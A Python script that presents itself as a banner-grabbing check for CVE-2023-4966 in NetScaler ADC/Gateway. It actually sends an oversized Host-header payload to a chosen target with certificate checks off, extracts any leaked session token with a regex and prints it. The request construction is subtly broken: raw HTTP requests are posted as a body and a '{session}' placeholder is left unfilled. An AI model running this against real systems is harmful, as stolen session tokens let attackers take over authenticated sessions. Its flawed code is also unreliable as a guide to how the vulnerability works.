#!/usr/bin/env python

# banner.py

import re
import requests
import random
import string
import urllib3
import argparse

# Disable InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    # Create an argument parser
    parser = argparse.ArgumentParser(description='Banner grabbing script for CVE-2023-4966')
    
    # Add an optional argument for the target
    parser.add_argument('-t', '--target', help='The Citrix ADC / Gateway target, excluding the protocol (e.g. 192.168.1.200, example.com)')

    # Parse the command-line arguments
    args = parser.parse_args()

    # Ask the user to enter the target asset or IP address if not provided as an argument
    if args.target is None:
        target_input = input("Enter the target asset or IP address: ")
    else:
        target_input = args.target

    target_hostname = target_input

    # Check if the target_input is an IP address (does not contain "://")
    if "://" not in target_input:
        target_hostname = "https://" + target_input  # Add "https://" if missing

    # Define the variables
    payload = 'a' * 24812
    rand_text_alpha = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))

    # Define the session token regular expression pattern
    session_token_pattern = r'\b([a-f0-9]{65})\b'

    # Define the HTTP request headers
    headers = {
        'User-Agent': 'python-requests/2.25.1',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Length': '0',
    }

    # Disable SSL certificate verification
    verify_ssl = False

    # Define the HTTP request for sensitive information disclosure
    http_request = f"""
    GET /oauth/idp/.well-known/openid-configuration HTTP/1.1
    {rand_text_alpha}: {target_hostname}
    Host: {payload}

    POST /logon/LogonPoint/Authentication/GetUserName HTTP/1.1
    Host: {target_hostname}
    Cookie: NSC_AAAC={{session}}
    User-Agent: python-requests/2.25.1
    Accept-Encoding: gzip, deflate, br
    Accept: */*
    Connection: close
    Content-Length: 0
    """

    # Send the HTTP request with SSL certificate verification disabled
    response = requests.post(target_hostname, data=http_request, headers=headers, verify=verify_ssl)

    # Extract the session token using regular expression
    session_token_match = re.search(session_token_pattern, response.text)
    if session_token_match:
        session_token = session_token_match.group(1)
        print(f"Session Token: {session_token}")

    # Check for specific words in the response to determine if exploitation was successful
    if "NSC_AAAC=" in response.text and '{"issuer":' in response.text:
        print("This Target is Vulnerable to CVE-2023-4966: Sensitive information disclosure in NetScaler ADC and NetScaler Gateway")
    else:
        print("This Target is not Vulnerable to CVE-2023-4966")

if __name__ == "__main__":
    main()
